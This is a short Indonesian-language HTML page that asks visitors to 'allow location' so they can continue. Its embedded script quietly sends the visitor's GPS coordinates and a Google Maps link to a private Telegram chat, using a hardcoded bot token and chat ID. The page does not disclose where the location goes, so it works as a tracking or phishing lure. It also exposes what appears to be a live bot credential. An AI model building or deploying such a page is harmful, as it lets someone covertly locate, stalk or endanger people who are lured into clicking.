<!DOCTYPE html>
<html>
<head>
  <title>Izinkan Lokasi</title>
</head>
<body>
  <h2>Izinkan Lokasi Anda</h2>
  <p>Tekan tombol di bawah untuk melanjutkan.</p>
  <button onclick="kirimLokasi()">Izinkan Lokasi</button>

  <script>
    const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
    const CHAT_ID = '7218964278';

    function kirimLokasi() {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const link = `https://maps.google.com/?q=${lat},${lon}`;
        const pesan = `Lokasi baru:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: ${link}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan
          })
        }).then(() => {
          alert("Lokasi berhasil dikirim!");
        }).catch(() => {
          alert("Gagal mengirim lokasi.");
        });
      }, () => {
        alert("Gagal mendapatkan lokasi.");
      });
    }
  </script>
</body>
</html>
